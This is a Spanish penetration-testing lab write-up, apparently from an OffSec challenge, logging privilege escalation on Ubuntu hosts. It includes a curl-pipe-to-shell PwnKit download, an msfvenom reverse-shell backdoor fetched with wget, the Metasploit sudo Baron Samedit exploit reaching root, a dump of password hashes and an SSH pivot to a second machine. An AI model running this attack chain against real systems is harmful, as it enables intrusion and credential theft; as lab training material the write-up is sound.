/snap/core20/1623/usr/bin/mount
/snap/core20/1623/usr/bin/newgrp
/snap/core20/1623/usr/bin/passwd
/snap/core20/1623/usr/bin/su
/snap/core20/1623/usr/bin/sudo
/snap/core20/1623/usr/bin/umount
/snap/core20/1623/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1623/usr/lib/openssh/ssh-keysign
$ sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
$ id
uid=1004(anita) gid=1004(anita) groups=1004(anita),998(apache)
$ ls
'GCONV_PATH=.'   local.txt
$ cd /tmp
$ pwd
/tmp
$ id
uid=1004(anita) gid=1004(anita) groups=1004(anita),998(apache)
$ sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
$ id
uid=1004(anita) gid=1004(anita) groups=1004(anita),998(apache)
$ ls
'GCONV_PATH=.'   systemd-private-0bbbd25782914308943f7c58f96666eb-ModemManager.service-YRQxyf     systemd-private-0bbbd25782914308943f7c58f96666eb-systemd-resolved.service-cJbk6e    vmware-root_600-2722697857
 snap.lxd        systemd-private-0bbbd25782914308943f7c58f96666eb-systemd-logind.service-chZWMf   systemd-private-0bbbd25782914308943f7c58f96666eb-systemd-timesyncd.service-n31Efh
$ pkexec
pkexec --version |
       --help |
       --disable-internal-agent |
       [--user username] PROGRAM [ARGUMENTS...]

See the pkexec manual page for more details.
$ which gcc
/usr/bin/gcc
$ aa-status | head
You do not have enough privilege to read the profile set.
apparmor module is loaded.
$
```
> Insistimos y enumeramos con les.sh

```bash
$ ./les.sh

Available information:

Kernel version: 5.4.0
Architecture: x86_64
Distribution: ubuntu
Distribution version: 20.04
Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed
Package listing: from current OS

Searching among:

81 kernel space exploits
49 user space exploits

Possible Exploits:

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: probable
   Tags: [ ubuntu=(20.04) ]{kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: probable
   Tags: [ ubuntu=20.04 ]{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154
```

#### subimos linpeas y obtenemos lo siguiente:

```bash
Vulnerable to CVE-2021-3560

╔══════════╣ Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.                                                                                                                     
apparmor module is loaded.
═╣ AppArmor profile? .............. unconfined
═╣ is linuxONE? ................... s390x Not Found
═╣ grsecurity present? ............ grsecurity Not Found                                                                                                                                                          
═╣ PaX bins present? .............. PaX Not Found                                                                                                                                                                 
═╣ Execshield enabled? ............ Execshield Not Found                                                                                                                                                          
═╣ SELinux enabled? ............... sestatus Not Found                                                                                                                                                            
═╣ Seccomp enabled? ............... disabled                                                                                                                                                                      
═╣ User namespace? ................ enabled
═╣ Cgroup2 enabled? ............... enabled
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (vmware) 

```
> Ninguno de los intentos de con los vectores **CVE-2021-4034** y **CVE-2021-3560** dio resultados, la tecer salida de **les.sh** es **CVE-2021-3156**

* Observamos la version de sudo:

```bash
$ sudo -V
Sudo version 1.8.31
Sudoers policy plugin version 1.8.31
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.31
```

* Buscamos en **MSF** un exploit:

```msfconsole
msf6 exploit(multi/handler) > search type:exploit cve-2021-3156

Matching Modules
================

   #   Name                                                                    Disclosure Date  Rank       Check  Description
   -   ----                                                                    ---------------  ----       -----  -----------
   0   exploit/linux/local/sudo_baron_samedit                                  2021-01-26       excellent  Yes    Sudo Heap-Based Buffer Overflow
   1     \_ target: Automatic                                                  .                .          .      .
   2     \_ target: Ubuntu 20.04 x64 (sudo v1.8.31, libc v2.31)                .                .          .      .
   3     \_ target: Ubuntu 20.04 x64 (sudo v1.8.31, libc v2.31) - alternative  .                .          .      .
   4     \_ target: Ubuntu 19.04 x64 (sudo v1.8.27, libc v2.29)                .                .          .      .
   5     \_ target: Ubuntu 18.04 x64 (sudo v1.8.21, libc v2.27)                .                .          .      .
   6     \_ target: Ubuntu 18.04 x64 (sudo v1.8.21, libc v2.27) - alternative  .                .          .      .
   7     \_ target: Ubuntu 16.04 x64 (sudo v1.8.16, libc v2.23)                .                .          .      .
   8     \_ target: Ubuntu 14.04 x64 (sudo v1.8.9p5, libc v2.19)               .                .          .      .
   9     \_ target: Debian 10 x64 (sudo v1.8.27, libc v2.28)                   .                .          .      .
   10    \_ target: Debian 10 x64 (sudo v1.8.27, libc v2.28) - alternative     .                .          .      .
   11    \_ target: CentOS 8 x64 (sudo v1.8.25p1, libc v2.28)                  .                .          .      .
   12    \_ target: CentOS 7 x64 (sudo v1.8.23, libc v2.17)                    .                .          .      .
   13    \_ target: CentOS 7 x64 (sudo v1.8.23, libc v2.17) - alternative      .                .          .      .
   14    \_ target: Fedora 27 x64 (sudo v1.8.21p2, libc v2.26)                 .                .          .      .
   15    \_ target: Fedora 26 x64 (sudo v1.8.20p2, libc v2.25)                 .                .          .      .
   16    \_ target: Fedora 25 x64 (sudo v1.8.18, libc v2.24)                   .                .          .      .
   17    \_ target: Fedora 24 x64 (sudo v1.8.16, libc v2.23)                   .                .          .      .
   18    \_ target: Fedora 23 x64 (sudo v1.8.14p3, libc v2.22)                 .                .          .      .
   19    \_ target: Manual                                                     .                .          .      .


Interact with a module by name or index. For example info 19, use 19 or use exploit/linux/local/sudo_baron_samedit
After interacting with a module you can manually set a TARGET with set TARGET 'Manual'
```
> **IMPORTANTE** el modulo requiere como opcion obligatoria una session meterpreter.

1. Levantamos la sesion meterpreter:

* Generamos el backdoor
```msfconsole
┌──(root㉿kali)-[/home/…/OffSec/Challenges/2_Relia/245-machine]
└─# msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.45.239 LPORT=4444 -f elf -o shell.elf
# servimos con python:
┌──(root㉿kali)-[/home/…/OffSec/Challenges/2_Relia/245-machine]
└─# python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
192.168.180.245 - - [09/Jun/2025 13:11:56] "GET /shell.elf HTTP/1.1" 200 -
# Solicitamos el backdor desde la sesion ssh de anita:
$ wget http://192.168.45.239:8000/shell.elf
--2025-06-09 16:11:51--  http://192.168.45.239:8000/shell.elf
Connecting to 192.168.45.239:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 250 [application/octet-stream]
Saving to: ‘shell.elf’

shell.elf                                            100%[====================================================================================================================>]     250  --.-KB/s    in 0s      

2025-06-09 16:11:51 (24.2 MB/s) - ‘shell.elf’ saved [250/250]

$ chmod +x shell.elf
$ ./shell.elf
```
* Configuramos el exploit/multi/handler
```msfconsole
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > options

Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target

View the full module info with the info, or info -d command.

msf6 exploit(multi/handler) > set LHOST 192.168.45.239
LHOST => 192.168.45.239
msf6 exploit(multi/handler) > set PAYLOAD linux/x64/meterpreter/reverse_tcp
PAYLOAD => linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.45.239:4444 
[*] Sending stage (3045380 bytes) to 192.168.180.245
[*] Meterpreter session 1 opened (192.168.45.239:4444 -> 192.168.180.245:41156) at 2025-06-09 13:24:19 -0300
```
> Si es necesario volver a ejecutar **./shell.elf**

2. Configuramos el exploit y ejecutamos:

```msfconsole
msf6 exploit(multi/handler) > search type:exploit cve-2021-3156

Matching Modules
================

   #   Name                                                                    Disclosure Date  Rank       Check  Description
   -   ----                                                                    ---------------  ----       -----  -----------
   0   exploit/linux/local/sudo_baron_samedit                                  2021-01-26       excellent  Yes    Sudo Heap-Based Buffer Overflow
   1     \_ target: Automatic                                                  .                .          .      .
   2     \_ target: Ubuntu 20.04 x64 (sudo v1.8.31, libc v2.31)                .                .          .      .
   3     \_ target: Ubuntu 20.04 x64 (sudo v1.8.31, libc v2.31) - alternative  .                .          .      .
   4     \_ target: Ubuntu 19.04 x64 (sudo v1.8.27, libc v2.29)                .                .          .      .
   5     \_ target: Ubuntu 18.04 x64 (sudo v1.8.21, libc v2.27)                .                .          .      .
   6     \_ target: Ubuntu 18.04 x64 (sudo v1.8.21, libc v2.27) - alternative  .                .          .      .
   7     \_ target: Ubuntu 16.04 x64 (sudo v1.8.16, libc v2.23)                .                .          .      .
   8     \_ target: Ubuntu 14.04 x64 (sudo v1.8.9p5, libc v2.19)               .                .          .      .
   9     \_ target: Debian 10 x64 (sudo v1.8.27, libc v2.28)                   .                .          .      .
   10    \_ target: Debian 10 x64 (sudo v1.8.27, libc v2.28) - alternative     .                .          .      .
   11    \_ target: CentOS 8 x64 (sudo v1.8.25p1, libc v2.28)                  .                .          .      .
   12    \_ target: CentOS 7 x64 (sudo v1.8.23, libc v2.17)                    .                .          .      .
   13    \_ target: CentOS 7 x64 (sudo v1.8.23, libc v2.17) - alternative      .                .          .      .
   14    \_ target: Fedora 27 x64 (sudo v1.8.21p2, libc v2.26)                 .                .          .      .
   15    \_ target: Fedora 26 x64 (sudo v1.8.20p2, libc v2.25)                 .                .          .      .
   16    \_ target: Fedora 25 x64 (sudo v1.8.18, libc v2.24)                   .                .          .      .
   17    \_ target: Fedora 24 x64 (sudo v1.8.16, libc v2.23)                   .                .          .      .
   18    \_ target: Fedora 23 x64 (sudo v1.8.14p3, libc v2.22)                 .                .          .      .
   19    \_ target: Manual                                                     .                .          .      .


Interact with a module by name or index. For example info 19, use 19 or use exploit/linux/local/sudo_baron_samedit
After interacting with a module you can manually set a TARGET with set TARGET 'Manual'

msf6 exploit(multi/handler) > use 0
[*] Using configured payload linux/x64/meterpreter/reverse_tcp
msf6 exploit(linux/local/sudo_baron_samedit) > options

Module options (exploit/linux/local/sudo_baron_samedit):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   SESSION                       yes       The session to run this module on
   WritableDir  /tmp             yes       A directory where you can write files.


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.5      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(linux/local/sudo_baron_samedit) > set SESSION 1
SESSION => 1
msf6 exploit(linux/local/sudo_baron_samedit) > set LHOST 192.168.45.239
LHOST => 192.168.45.239
msf6 exploit(linux/local/sudo_baron_samedit) > set LPORT 1234
LPORT => 1234
msf6 exploit(linux/local/sudo_baron_samedit) > run
[*] Started reverse TCP handler on 192.168.45.239:1234 
[*] Running automatic check ("set AutoCheck false" to disable)
[!] The service is running, but could not be validated. sudo 1.8.31 may be a vulnerable build.
[*] Using automatically selected target: Ubuntu 20.04 x64 (sudo v1.8.31, libc v2.31)
[*] Writing '/tmp/Xee5yp.py' (763 bytes) ...
[*] Writing '/tmp/libnss_Qc/uZFK .so.2' (540 bytes) ...
[*] Sending stage (3045380 bytes) to 192.168.180.245
[+] Deleted /tmp/Xee5yp.py
[+] Deleted /tmp/libnss_Qc/uZFK .so.2
[+] Deleted /tmp/libnss_Qc
[*] Meterpreter session 2 opened (192.168.45.239:1234 -> 192.168.180.245:35172) at 2025-06-09 14:01:25 -0300

meterpreter > getuid
Server username: root
meterpreter >
```
3. Obtenemos el flag:

```msfconsole
meterpreter > pwd
/tmp
meterpreter > cd /root
meterpreter > pwd
/root
meterpreter > ls
Listing: /root
==============

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100600/rw-------  101   fil   2022-11-11 09:07:58 -0300  .bash_history
100644/rw-r--r--  3106  fil   2019-12-05 11:39:21 -0300  .bashrc
040700/rwx------  4096  dir   2022-10-26 07:19:07 -0300  .cache
040755/rwxr-xr-x  4096  dir   2022-10-26 07:20:00 -0300  .local
100644/rw-r--r--  161   fil   2019-12-05 11:39:21 -0300  .profile
040700/rwx------  4096  dir   2022-10-12 04:57:28 -0300  .ssh
100644/rw-r--r--  209   fil   2022-10-12 05:55:45 -0300  .wget-hsts
100644/rw-r--r--  33    fil   2025-06-09 12:15:09 -0300  proof.txt
040755/rwxr-xr-x  4096  dir   2022-10-12 04:57:43 -0300  snap

meterpreter > cat proof.txt
1e0dc9497b51bcc3f37a7dd885264cdc
meterpreter >
```

#### Buscamos credenciales que nos permitan acceder a otra maquina:

```msfconsole
msf6 exploit(linux/local/sudo_baron_samedit) > sessions -l

Active sessions
===============

  Id  Name  Type                   Information              Connection
  --  ----  ----                   -----------              ----------
  1         meterpreter x64/linux  anita @ 192.168.180.245  192.168.45.239:4444 -> 192.168.180.245:41156 (192.168.180.245)
  2         meterpreter x64/linux  root @ 192.168.180.245   192.168.45.239:1234 -> 192.168.180.245:35172 (192.168.180.245)

msf6 exploit(linux/local/sudo_baron_samedit) > search type:post linux

Matching Modules
================

   #   Name                                                          Disclosure Date  Rank       Check  Description
   -   ----                                                          ---------------  ----       -----  -----------
   ...

   25  post/linux/gather/enum_configs                                .                normal     No     Linux Gather Configurations
   26  post/linux/gather/checkcontainer                              .                normal     No     Linux Gather Container Detection
   27  post/linux/gather/hashdump                                    .                normal     No     Linux Gather Dump Password Hashes for Linux Systems # Interesante.
   28  post/linux/gather/gnome_commander_creds                       .                normal     No     Linux Gather Gnome-Commander Creds
   29  post/multi/gather/enum_hexchat                                .                normal     No     Linux Gather HexChat/XChat Enumeration
   
   ...

msf6 exploit(linux/local/sudo_baron_samedit) > use 27
msf6 post(linux/gather/hashdump) > options

Module options (post/linux/gather/hashdump):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


View the full module info with the info, or info -d command.

msf6 post(linux/gather/hashdump) > set SESSION 2
SESSION => 2
msf6 post(linux/gather/hashdump) > run
[+] root:$6$hUF5ezihFkozDRs7$AAkBctkoXVYOjhYOLW22EDkdoXXM085da.v9tPQTZlUtNvKNdV.jrZl5M.WbRJyyQyjh//JXUH0hyQVyyhWgj/:0:0:root:/root:/bin/bash
[+] offsec:$6$p6n32TS.3/wDw7ax$TNwiUYnzlmx7Q0w59MbhSRjqW37W20OpGs/fCRJ3XiffbBVQuZTwtGeIJglRJg0F0vFKNBT39a57gakRJ2zPw/:1000:1000:Offsec Admin:/home/offsec:/bin/bash
[+] miranda:$6$01GOUNyvP1lFg0Id$QoFsKEsD4um4ctVU62MU/KEmQbdj0OSw7gJ6EXVA4YTjTNxvfzQxdhdsyjHUaw4qO0YAwEMoXUXWBdCd3zW4V.:1001:1001:Miranda:/home/miranda:/bin/sh
[+] steven:$6$Rj4tu27TLjcnwC2v$wsNuqImPdduB9mXZHpjjEROvTKwWsp2SckcMB.AtcvHyS7tHTCGh.CrUCP0ogsFH9IjG3i2qekcAXRlkmeZOT1:1002:1002:Steven:/home/steven:/bin/sh
[+] mark:$6$blWxRVRno5YcdGiN$6ekTTBXDvGfaFRSPxZVLhR8tAmFd20RLlXNL5Q8U44gp0Heq7MLmFZrlaHeaX.pFhlJ3lif10E1zsO3W2tdbC/:1003:1003:Mark:/home/mark:/bin/sh
[+] anita:$6$Fq6VqZ4n0zxZ9Jh8$4gcSpNrlib60CDuGIHpPZVT0g/CeVDV0jR3fkOC7zIEaWEsnkcQfKp8YVCaZdGFvaEsHCuYHbALFn49meC.Rj1:1004:1004:Anita:/home/anita:/bin/sh
[+] Unshadowed Password File: /root/.msf4/loot/20250609154140_relia_192.168.180.245_linux.hashes_997206.txt
[*] Post module execution completed
msf6 post(linux/gather/hashdump) > loot

Loot
====

host             service  type                  name                   content     info                            path
----             -------  ----                  ----                   -------     ----                            ----
192.168.180.245           linux.passwd          passwd.tx              text/plain  Linux Passwd File               /root/.msf4/loot/20250609154137_relia_192.168.180.245_linux.passwd_700690.txt
192.168.180.245           linux.shadow          shadow.tx              text/plain  Linux Password Shadow File      /root/.msf4/loot/20250609154138_relia_192.168.180.245_linux.shadow_517407.txt
192.168.180.245           linux.passwd.history  opasswd.tx             text/plain  Linux Passwd History File       /root/.msf4/loot/20250609154139_relia_192.168.180.245_linux.passwd.his_960666.txt
192.168.180.245           linux.hashes          unshadowed_passwd.pwd  text/plain  Linux Unshadowed Password File  /root/.msf4/loot/20250609154140_relia_192.168.180.245_linux.hashes_997206.txt

msf6 post(linux/gather/hashdump) > creds
Credentials
===========

host  origin           service  public   private                                                                                   realm  private_type        JtR Format    cracked_password
----  ------           -------  ------   -------                                                                                   -----  ------------        ----------    ----------------
      192.168.180.245           root     $6$hUF5ezihFkozDRs7$AAkBctkoXVYOjhYOLW22EDkdoXXM085da.v9tPQTZlUtNvKNdV.jrZl5 (TRUNCATED)         Nonreplayable hash  sha512,crypt
      192.168.180.245           offsec   $6$p6n32TS.3/wDw7ax$TNwiUYnzlmx7Q0w59MbhSRjqW37W20OpGs/fCRJ3XiffbBVQuZTwtGeI (TRUNCATED)         Nonreplayable hash  sha512,crypt
      192.168.180.245           miranda  $6$01GOUNyvP1lFg0Id$QoFsKEsD4um4ctVU62MU/KEmQbdj0OSw7gJ6EXVA4YTjTNxvfzQxdhds (TRUNCATED)         Nonreplayable hash  sha512,crypt
      192.168.180.245           steven   $6$Rj4tu27TLjcnwC2v$wsNuqImPdduB9mXZHpjjEROvTKwWsp2SckcMB.AtcvHyS7tHTCGh.CrU (TRUNCATED)         Nonreplayable hash  sha512,crypt
      192.168.180.245           mark     $6$blWxRVRno5YcdGiN$6ekTTBXDvGfaFRSPxZVLhR8tAmFd20RLlXNL5Q8U44gp0Heq7MLmFZrl (TRUNCATED)         Nonreplayable hash  sha512,crypt
      192.168.180.245           anita    $6$Fq6VqZ4n0zxZ9Jh8$4gcSpNrlib60CDuGIHpPZVT0g/CeVDV0jR3fkOC7zIEaWEsnkcQfKp8Y (TRUNCATED)         Nonreplayable hash  sha512,crypt
```
#### Probamos las credenciales ssh de anita en el otro servidor .246 y entramos:
```bash
┌──(root㉿kali)-[/home/…/OffSec/Challenges/2_Relia/245-machine]
└─# ssh -i id_ecdsa_anita -p 2222 anita@192.168.104.246
The authenticity of host '[192.168.104.246]:2222 ([192.168.104.246]:2222)' can't be established.
ED25519 key fingerprint is SHA256:4g8ssrvbgowohNQnriYhXGCgKvR01WciUUGeVxvx+uE.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.104.246]:2222' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_ecdsa_anita': 
Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-52-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Jun 11 11:19:24 PM UTC 2025

  System load:  0.0               Processes:               146
  Usage of /:   60.1% of 6.06GB   Users logged in:         0
  Memory usage: 12%               IPv4 address for ens192: 192.168.104.246
  Swap usage:   0%

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

5 updates can be applied immediately.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Wed Oct 26 19:00:52 2022 from 192.168.118.2
$ 

```
- Obtenemos el flag local.txt

```bash
$ cat local.txt
306c7aaf53142804b30c14605b63e057
```
#### Session meterpreter

```bash
┌──(root㉿kali)-[/home/…/OffSec/Challenges/2_Relia/245-machine]
└─# msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.45.213 LPORT=4444 -f elf -o shell.elf
```
- En msf:

```msfconsole

msf6 exploit(multi/handler) > set PAYLOAD linux/x86/meterpreter/reverse_tcp
PAYLOAD => linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.45.213
LHOST => 192.168.45.213

msf6 exploit(multi/handler) > options

Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.45.213   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target

View the full module info with the info, or info -d command.

msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.45.213:4444 
[*] Sending stage (1017704 bytes) to 192.168.231.246
[*] Meterpreter session 1 opened (192.168.45.213:4444 -> 192.168.231.246:49368) at 2025-06-12 19:20:48 -0300

meterpreter >
```
- Servimos y subimos el **shell.elf** y repetimos los pasos del metrpreter anterior

- Enumeramos desde la sesion meterpreter

```bash
meterpreter > ps

Process List
============

 PID    PPID  Name                                   Arch    User              Path
 ---    ----  ----                                   ----    ----              ----
 1      0     systemd                                x86_64  root
 2      0     [kthreadd]                             x86_64  root
 3      2     [rcu_gp]                               x86_64  root
 4      2     [rcu_par_gp]                           x86_64  root
 5      2     [netns]                                x86_64  root
 7      2     [kworker/0:0H-events_highpri]          x86_64  root
 9      2     [kworker/0:1H-events_highpri]          x86_64  root
 10     2     [mm_percpu_wq]                         x86_64  root
 11     2     [rcu_tasks_rude_]                      x86_64  root
 12     2     [rcu_tasks_trace]                      x86_64  root
 13     2     [ksoftirqd/0]                          x86_64  root
 14     2     [rcu_sched]                            x86_64  root
 15     2     [migration/0]                          x86_64  root
 16     2     [idle_inject/0]                        x86_64  root
 18     2     [cpuhp/0]                              x86_64  root
 19     2     [kdevtmpfs]                            x86_64  root
 20     2     [inet_frag_wq]                         x86_64  root
 21     2     [kauditd]                              x86_64  root
 22     2     [khungtaskd]                           x86_64  root
 23     2     [oom_reaper]                           x86_64  root
 24     2     [writeback]                            x86_64  root
 25     2     [kcompactd0]                           x86_64  root
 26     2     [ksmd]                                 x86_64  root
 27     2     [khugepaged]                           x86_64  root
 73     2     [kintegrityd]                          x86_64  root
 74     2     [kblockd]                              x86_64  root
 75     2     [blkcg_punt_bio]                       x86_64  root
 76     2     [tpm_dev_wq]                           x86_64  root
 77     2     [ata_sff]                              x86_64  root
 78     2     [md]                                   x86_64  root
 79     2     [edac-poller]                          x86_64  root
 80     2     [devfreq_wq]                           x86_64  root
 81     2     [watchdogd]                            x86_64  root
 84     2     [kswapd0]                              x86_64  root
 85     2     [ecryptfs-kthrea]                      x86_64  root
 87     2     [kthrotld]                             x86_64  root
 88     2     [irq/24-pciehp]                        x86_64  root
 89     2     [irq/25-pciehp]                        x86_64  root
 90     2     [irq/26-pciehp]                        x86_64  root
 91     2     [irq/27-pciehp]                        x86_64  root
 92     2     [irq/28-pciehp]                        x86_64  root
 93     2     [irq/29-pciehp]                        x86_64  root
 94     2     [irq/30-pciehp]                        x86_64  root
 95     2     [irq/31-pciehp]                        x86_64  root
 96     2     [irq/32-pciehp]                        x86_64  root
 97     2     [irq/33-pciehp]                        x86_64  root
 98     2     [irq/34-pciehp]                        x86_64  root
 99     2     [irq/35-pciehp]                        x86_64  root
 100    2     [irq/36-pciehp]                        x86_64  root
 101    2     [irq/37-pciehp]                        x86_64  root
 102    2     [irq/38-pciehp]                        x86_64  root
 103    2     [irq/39-pciehp]                        x86_64  root
 104    2     [irq/40-pciehp]                        x86_64  root
 105    2     [irq/41-pciehp]                        x86_64  root
 106    2     [irq/42-pciehp]                        x86_64  root
 107    2     [irq/43-pciehp]                        x86_64  root
 108    2     [irq/44-pciehp]                        x86_64  root
 109    2     [irq/45-pciehp]                        x86_64  root
 110    2     [irq/46-pciehp]                        x86_64  root
 111    2     [irq/47-pciehp]                        x86_64  root
 112    2     [irq/48-pciehp]                        x86_64  root
 113    2     [irq/49-pciehp]                        x86_64  root
 114    2     [irq/50-pciehp]                        x86_64  root
 115    2     [irq/51-pciehp]                        x86_64  root
 116    2     [irq/52-pciehp]                        x86_64  root
 117    2     [irq/53-pciehp]                        x86_64  root
 118    2     [irq/54-pciehp]                        x86_64  root
 119    2     [irq/55-pciehp]                        x86_64  root
 120    2     [acpi_thermal_pm]                      x86_64  root
 122    2     [scsi_eh_0]                            x86_64  root
 123    2     [scsi_tmf_0]                           x86_64  root
 124    2     [scsi_eh_1]                            x86_64  root
 125    2     [scsi_tmf_1]                           x86_64  root
 127    2     [vfio-irqfd-clea]                      x86_64  root
 129    2     [mld]                                  x86_64  root
 130    2     [ipv6_addrconf]                        x86_64  root
 141    2     [kstrp]                                x86_64  root
 144    2     [zswap-shrink]                         x86_64  root
 145    2     [kworker/u3:0]                         x86_64  root
 150    2     [charger_manager]                      x86_64  root
 189    2     [scsi_eh_2]                            x86_64  root
 190    2     [scsi_tmf_2]                           x86_64  root
 191    2     [vmw_pvscsi_wq_2]                      x86_64  root
 194    2     [cryptd]                               x86_64  root
 235    2     [ttm_swap]                             x86_64  root
 237    2     [irq/16-vmwgfx]                        x86_64  root
 238    2     [card0-crtc0]                          x86_64  root
 239    2     [card0-crtc1]                          x86_64  root
 240    2     [card0-crtc2]                          x86_64  root
 241    2     [card0-crtc3]                          x86_64  root
 242    2     [card0-crtc4]                          x86_64  root
 243    2     [card0-crtc5]                          x86_64  root
 244    2     [card0-crtc6]                          x86_64  root
 245    2     [card0-crtc7]                          x86_64  root
 253    2     [kdmflush]                             x86_64  root
 279    2     [raid5wq]                              x86_64  root
 330    2     [jbd2/dm-0-8]                          x86_64  root
 331    2     [ext4-rsv-conver]                      x86_64  root
 402    1     systemd-journald                       x86_64  root
 433    2     [kaluad]                               x86_64  root
 434    2     [ipmi-msghandler]                      x86_64  root
 435    2     [kmpath_rdacd]                         x86_64  root
 438    2     [kmpathd]                              x86_64  root
 439    2     [kmpath_handlerd]                      x86_64  root
 440    1     multipathd                             x86_64  root
 443    1     systemd-udevd                          x86_64  root
 607    2     [jbd2/sda2-8]                          x86_64  root
 610    2     [ext4-rsv-conver]                      x86_64  root
 625    1     systemd-timesyncd                      x86_64  systemd-timesync
 635    1     VGAuthService                          x86_64  root
 636    1     vmtoolsd                               x86_64  root
 723    1     systemd-networkd                       x86_64  systemd-network
 725    1     systemd-resolved                       x86_64  systemd-resolve
 747    1     cron                                   x86_64  root
 749    1     dbus-daemon                            x86_64  messagebus
 758    1     python3                                x86_64  root
 760    1     polkitd                                x86_64  root
 761    1     rsyslogd                               x86_64  syslog
 763    1     snapd                                  x86_64  root
 765    1     systemd-logind                         x86_64  root
 767    1     udisksd                                x86_64  root
 773    1     agetty                                 x86_64  root
 817    1     ModemManager                           x86_64  root
 820    1     sshd                                   x86_64  root
 863    1     apache2                                x86_64  root
 870    1     python3                                x86_64  root
 1337   2     [kworker/0:2-cgroup_destroy]           x86_64  root
 1539   820   sshd                                   x86_64  root
 1543   1     systemd                                x86_64  anita             /usr/lib/systemd/systemd
 1545   1543  (sd-pam)                               x86_64  anita
 1652   1539  sshd                                   x86_64  anita
 1658   1652  sh                                     x86_64  anita             /usr/bin/dash
 4779   1543  dbus-daemon                            x86_64  anita             /usr/bin/dbus-daemon
 10493  1543  gpg-agent                              x86_64  anita
 28059  863   apache2                                x86_64  www-data
 28060  863   apache2                                x86_64  www-data
 28061  863   apache2                                x86_64  www-data
 28062  863   apache2                                x86_64  www-data
 28063  863   apache2                                x86_64  www-data
 28138  1658  shell.elf                              x86     anita             /home/anita/shell.elf
